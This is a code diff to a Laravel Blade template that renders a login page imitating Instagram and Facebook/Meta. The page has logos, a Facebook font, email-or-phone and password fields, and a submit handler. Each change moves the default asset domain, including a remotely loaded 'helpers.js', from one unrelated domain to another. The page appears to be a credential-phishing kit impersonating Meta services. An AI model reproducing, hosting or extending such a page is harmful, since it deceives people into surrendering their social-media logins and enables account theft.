@@ -16,7 +16,7 @@
     <meta property="og:type" content="article" />
     @vite(['resources/css/app.css'])
     <link rel="shortcut icon"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/favicon.ico">
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/instagram/favicon.ico">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -35,7 +35,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -48,7 +48,7 @@
     <div class="w-[95vw] lg:w-[99vw] mx-auto mt-[30px] relative h-[90vh]">
         <p class="text-center text-sm text-[#646d74]">{{ __('facebook.' . app()->getLocale()) }}</p>
         <div class="h-[200px] flex justify-center items-center">
-            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/ig_logo.webp"
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/instagram/ig_logo.webp"
                 alt="ig-logo" width="60">
         </div>
         <p class="font-semibold mb-3 ml-2">{{ $data->login_warning }}</p>
@@ -65,7 +65,7 @@
                         class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                         for="user">{{ __('facebook.email_or_phone') }}</label>
                     <button type="button" id="close_btn" class="cursor-pointer hidden">
-                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
+                        <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/close_logo.svg"
                             width="25" />
                     </button>
                 </div>
@@ -80,11 +80,11 @@
                         for="pass">{{ __('facebook.password') }}</label>
                     @if ($setting->showFacebookPasswordButton)
                         <button type="button" id="show_pass" class="cursor-pointer hidden">
-                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/show_pass.svg"
                                 width="25" />
                         </button>
                         <button type="button" id="hide_pass" class="cursor-pointer hidden">
-                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/hide_pass.svg"
                                 width="25" />
                         </button>
                     @endif
@@ -102,7 +102,7 @@
                 class="outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
                 {{ __('facebook.create_new_account') }}
             </button>
-            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/meta_logo.png"
                 alt="fb-logo" width="55">
             <div class="flex justify-center items-center gap-2">
                 <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.introduce') }}</p>
@@ -111,7 +111,7 @@
             </div>
         </div>
     </div>
-    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/helpers.js"></script>
     <script>
         $("#submit").submit(function(e) {
             e.preventDefault();
